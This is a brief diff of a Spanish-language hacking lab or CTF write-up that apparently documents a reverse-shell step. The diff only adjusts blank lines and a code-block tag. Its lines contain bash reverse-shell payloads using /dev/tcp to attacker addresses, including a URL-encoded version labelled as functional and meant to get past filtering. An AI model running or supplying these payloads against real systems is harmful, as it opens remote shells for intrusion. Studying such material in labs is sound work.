@@ -596,9 +596,7 @@ echo "Necesito los informes de la semana pasada ya Alice." > /home/alice/nota.tx
 ```
 
 ```bash
-
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-
 ```
 
 #### 💡 Solución: Payload codificado en hexadecimal (URL encoded)
@@ -609,7 +607,7 @@ Se utilizó una reverse shell clásica en **bash**, codificada con `%HEX` para e
 bash -c "bash -i >& /dev/tcp/<IP_Atacante>/4444 0>&1"
 ```
 ##### ✅ Payload funcional (codificado en hexadecimal):
-```bash
+```text
 bash+-c+%22bash+-i+%3E%26+/dev/tcp/192.168.0.19/4444+0%3E%261%22
 ```
 
